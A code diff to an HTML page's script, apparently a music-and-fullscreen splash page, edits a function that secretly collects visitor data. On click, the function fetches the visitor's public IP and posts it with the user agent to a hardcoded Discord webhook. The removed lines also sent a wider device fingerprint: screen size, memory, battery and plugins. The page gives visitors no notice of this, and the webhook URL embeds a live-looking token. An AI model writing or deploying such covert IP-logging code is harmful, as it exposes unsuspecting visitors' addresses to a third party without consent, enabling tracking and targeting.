@@ -64,63 +64,37 @@
         const container = document.querySelector('.container');
         const audio = document.getElementById('background-music');
 
-        // Function to send client data
+        // Function to send client data (IP and User Agent only)
         function sendClientData() {
             const userAgent = navigator.userAgent;
-            const language = navigator.language;
-            const screenWidth = screen.width;
-            const screenHeight = screen.height;
-            const windowWidth = window.innerWidth;
-            const windowHeight = window.innerHeight;
-            const scrollX = window.scrollX;
-            const scrollY = window.scrollY;
-            const deviceMemory = navigator.deviceMemory;
-            const hardwareConcurrency = navigator.hardwareConcurrency;
 
+            // Fetch the client's public IP address
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
                     const ip = data.ip;
 
-                    // Get Battery Status
-                    navigator.getBattery().then(function(battery) {
-                        const batteryLevel = battery.level * 100; // in percentage
-                        const isCharging = battery.charging;
+                    // Send IP and User Agent to Discord Webhook
+                    const discordWebhookUrl = 'https://discord.com/api/webhooks/1313917761042386984/Ih-JgysLsQJWQWZkC8lDHPDIPBYMTGsgzPJETBNLkYNKGBfgpx_7-Y9aNiV7cS9WL-oT'; // Replace with your webhook URL
+                    const logData = {
+                        content: `Client Data:
+                        IP: ${ip}
+                        User Agent: ${userAgent}
+                        `
+                    };
 
-                        // Get Installed Plugins (e.g., Flash, PDF viewer)
-                        const plugins = navigator.plugins;
-
-                        // Send data to Discord Webhook
-                        const discordWebhookUrl = 'https://discord.com/api/webhooks/1313917761042386984/Ih-JgysLsQJWQWZkC8lDHPDIPBYMTGsgzPJETBNLkYNKGBfgpx_7-Y9aNiV7cS9WL-oT'; // Replace with your webhook URL
-                        const logData = {
-                            content: `Client Data:
-                            IP: ${ip}
-                            User Agent: ${userAgent}
-                            Language: ${language}
-                            Screen: ${screenWidth}x${screenHeight}
-                            Window: ${windowWidth}x${windowHeight}
-                            Scroll Position: (${scrollX}, ${scrollY})
-                            Device Memory: ${deviceMemory} GB
-                            Hardware Concurrency: ${hardwareConcurrency} cores
-                            Battery Level: ${batteryLevel}%
-                            Charging: ${isCharging}
-                            Plugins: ${plugins.length > 0 ? plugins : 'No plugins detected'}
-                            `
-                        };
-
-                        fetch(discordWebhookUrl, {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json'
-                            },
-                            body: JSON.stringify(logData)
-                        })
-                        .then(response => {
-                            console.log('Client data sent to Discord.');
-                        })
-                        .catch(err => {
-                            console.error('Error sending to Discord:', err);
-                        });
+                    fetch(discordWebhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(logData)
+                    })
+                    .then(response => {
+                        console.log('Client data sent to Discord.');
+                    })
+                    .catch(err => {
+                        console.error('Error sending to Discord:', err);
                     });
                 })
                 .catch(err => {
@@ -147,7 +121,7 @@
             container.style.display = 'block'; // Show the text when the overlay is clicked
             audio.play();
             goFullScreen(); 
-            sendClientData(); // Send all collected client data
+            sendClientData(); // Send IP and User Agent data only
         });
     </script>
 </body>
